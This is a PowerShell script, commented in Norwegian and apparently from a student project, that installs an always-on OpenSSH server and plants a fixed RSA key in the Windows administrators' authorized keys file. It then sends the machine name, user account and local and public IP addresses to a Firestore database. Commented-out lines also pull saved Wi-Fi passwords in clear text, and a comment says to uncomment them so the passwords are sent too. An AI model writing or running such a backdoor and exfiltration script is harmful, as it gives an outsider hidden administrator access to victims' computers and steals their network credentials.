# Slått sammen ssh.ps1 og netpass.ps1 så nettverkspassord også sendes
# Har ikke testet dette scriptet med sending av passord

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic

cd C:\ProgramData\ssh
New-Item -ItemType File -Path ".\administrators_authorized_keys"
icacls.exe "C:/ProgramData/ssh/administrators_authorized_keys" /inheritance:r /grant "Administrators:F" /grant "SYSTEM:F"
Add-Content -Path ".\administrators_authorized_keys" -Value "
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCwAFU06iFUe3eKSgT+l1P7gS0i86mkPYXt4H/1l8qfkQWSek1pW15v7SRM9Chdpdu4CG5ygTkOzywr+skVdW3UuSeLdCWenGt9r8AF3mPI+J2AucZeJW0o5qUKEmLk3+X7n69G1rZzbPhxkzNjdP8eptQ8RBDH7S0Ef5cPjCu0Ci9sEGuDXi0aINuo7Kah6QvKUQqF0ZS5DkZ3WJhMvcg/z2l84hPfg3DaulZ4yA+c8EvyxGOnLcgYC51DRRo2KZSQuAfsSYL83VlGDIxIegjFlgSrWj+PVo6e16135jT2nbOVvlN/Jhz8bPA8PpmHdamjoNr1qUtJnHIUYMBezNxDYmwlDJuTOoG0lyZCZPF+9GXIyHqSDA4192Cq5u4kWP1CiJ77/0UbfNJmXi5+n3E/CBjQuiIPwh8fpS03xPpYpafLPEWO1tUfjIdruApdiS9ljayDLg76Cv8ZBCoScIxnr3d0ava0BJF4wIFyhcRZYBjwtKvSShcMVw7hFQxJj48=
"

# Define the URL for the Firestore database
$projectID = "bachelor-7e242"  # Your project ID
$collectionName = "machines"  # Target collection

# Get the name of the PC
$pcName = [System.Environment]::MachineName

# Get the current user's username
$userName = [System.Environment]::UserName

# Escape spaces in the PC name
$escapedPcName = $pcName.Replace(" ", "%20")

# Define the URL for the document
$documentUrl = "https://firestore.googleapis.com/v1/projects/$projectID/databases/(default)/documents/$collectionName/$escapedPcName"

# Create or update a document with a dummy field to initialize
$newDocBody = @{
    fields = @{
        dummyField = @{ stringValue = "init" }
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $newDocBody -ContentType 'application/json'
} catch {
    Write-Error "Error creating or updating document: $_"
}

# Wait to ensure the document is created or updated
Start-Sleep -Seconds 5

# Define the URL for the new sub-collection with the current date and time as the name
$dateTimeCollectionName = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss")
$newCollectionUrl = "$documentUrl/$dateTimeCollectionName"

# Get network passwords and store in JSON object
# $networkPasswords = @{}
$profiles = netsh wlan show profiles | Select-String -Pattern "All User Profile\s*:\s*(.+)"

# foreach ($profile in $profiles) {
    # $profileName = $profile.Matches.Groups[1].Value.Trim()
    # $keyInfo = netsh wlan show profile name="$profileName" key=clear | Select-String -Pattern "Key Content\s*:\s*(.+)"

    # if ($keyInfo) {
        # $key = $keyInfo.Matches.Groups[1].Value.Trim()
        # $networkPasswords[$profileName] = $key
    # }
# }

# Other info
$timestamp = Get-Date -Format "yyyyMMddTHHmmss"
# $authorizedKeys = Get-Content -Path C:\ProgramData\ssh\administrators_authorized_keys
$ethIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet").IPAddress
# $wifiIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi").IPAddress
$publicIP = (Invoke-WebRequest ifconfig.me/ip).Content
$user = whoami

$infoToSave = @{
    timestamp = @{ stringValue = $timestamp }
    # authorizedKeys = @{ stringValue = $authorizedKeys }
    ethIP = @{ stringValue = $ethIP }
    # wifiIP = @{ stringValue = $wifiIP }
    publicIP = @{ stringValue = $publicIP }
    user = @{ stringValue = $user }
    # Fjern kommentar under for å sende passord
    # networkPasswords = @{ stringValue = $networkPasswords }
}

# Create a JSON body for the POST request
$body = @{
    fields = $infoToSave
} | ConvertTo-Json -Depth 10

# Define HTTP headers
$headers = @{
    "Content-Type" = "application/json"
}

# Send the POST request to create the new sub-collection and store the information
try {
    $response = Invoke-RestMethod -Uri $newCollectionUrl -Method Post -Body $body -Headers $headers
} catch {
    Write-Error "Error sending data to Firestore: $_"
}

# Remove the dummy field
$removeDummyField = @{
    fields = @{
        dummyField = @{ nullValue = $null }
    }
} | ConvertTo-Json -Depth 2

try {
    Invoke-RestMethod -Uri $documentUrl -Method Patch -Body $removeDummyField -ContentType 'application/json'
} catch {
    Write-Error "Error removing dummy field from the document: $_"
}
